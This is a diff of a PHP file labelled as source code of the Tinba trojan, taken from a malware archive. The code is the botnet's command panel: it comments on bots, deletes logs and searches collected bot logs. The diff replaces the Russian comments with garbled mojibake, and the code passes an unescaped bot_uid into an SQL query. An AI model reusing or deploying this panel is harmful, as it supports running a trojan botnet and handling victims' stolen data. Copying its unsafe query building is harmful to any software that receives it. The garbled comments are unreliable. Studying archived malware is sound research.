@@ -1,3 +1,14 @@
+/*
+  name      Tinba
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 <?php
 
 	if (!BOT) exit();
@@ -7,7 +18,7 @@
 
 
 // ##############
-// Коммент к боту
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 if (isset($_POST['botcomment'])) {
 	$_POST['botcomment'] = mysql_escape_string($_POST['botcomment']);
 	$query = "UPDATE `bots` SET `comment`='{$_POST['botcomment']}' WHERE `bot_uid`='{$_POST['bot_uid']}'";
@@ -17,7 +28,7 @@ if (isset($_POST['botcomment'])) {
 
 
 // ##############
-// Коммент к логу
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 if (isset($_POST['logcomment'])) {
 	$_POST['logcomment'] = mysql_escape_string($_POST['logcomment']);
 	foreach($LOGSTABLES as $var) {
@@ -29,7 +40,7 @@ if (isset($_POST['logcomment'])) {
 
 
 // ##############
-// Удаление логов
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 if (isset($_POST['dellogs'])) {
 	array_walk($_POST['logid'], 'intval');
 	foreach($LOGSTABLES as $var) {
@@ -41,12 +52,12 @@ if (isset($_POST['dellogs'])) {
 
 
 // ##############
-// Поиск по фразе
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 if(isset($_POST['phrase'])){
 
 
 	// ###################
-	// Логирование поисков
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!empty($_POST['phrase'])) {
 		$fp = fopen('../data/temp/searchlog.txt', 'a');
 		fwrite($fp, date("d.m.Y H:i:s")."\t".$_SERVER['REMOTE_ADDR']."\t".$_POST['phrase']."\n");
@@ -55,7 +66,7 @@ if(isset($_POST['phrase'])){
 
 
 // ##############
-// Условия поиска
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	$CONDITIONS = '';
 	if (!empty($_POST['phrase'])) $CONDITIONS[] = "`data` LIKE '%".mysql_escape_string($_POST['phrase'])."%'";
 	if (!empty($_POST['']));
@@ -63,7 +74,7 @@ if(isset($_POST['phrase'])){
 
 
 // ##################
-// Таблицы для поиска
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	$SELTABLES = array();
 	sort($LOGSTABLES);
 	reset($LOGSTABLES);
@@ -80,14 +91,14 @@ if(isset($_POST['phrase'])){
 
 
 // #####################
-// Сборка запроса к базе
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 	foreach($SELTABLES as $key => $var) $SELTABLES[$key] = "SELECT * FROM `{$var}`".$CONDITIONS;
 	$query = implode(' UNION ', $SELTABLES).' LIMIT '.intval($_POST['limit']);
 	$result = mysql_query($query) or die("Query failed : " . mysql_error());
 
 
 // #################
-// Выдача результата
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	print "<!-- Search result begin -->
 <input type='submit' value='Expand all' class='button' onclick=\"$(this).parent().find('div').show();\"><input type='submit' value='Collapse all' class='button' onclick=\"$(this).parent().find('div').hide();\"><input type='submit' value='Toggle' class='button' onclick=\"$(this).parent().find('div').toggle();\"> |
 <input type='submit' value='Select all' class='button' onclick=\"$(this).parent().find(':checkbox').attr('checked', true);\"><input type='submit' value='Unselect all' class='button'onclick=\"$(this).parent().find(':checkbox').removeAttr('checked');\"><input type='submit' value='Invert' class='button'onclick=\"$(this).parent().find(':checkbox').checkToggle();\"> |
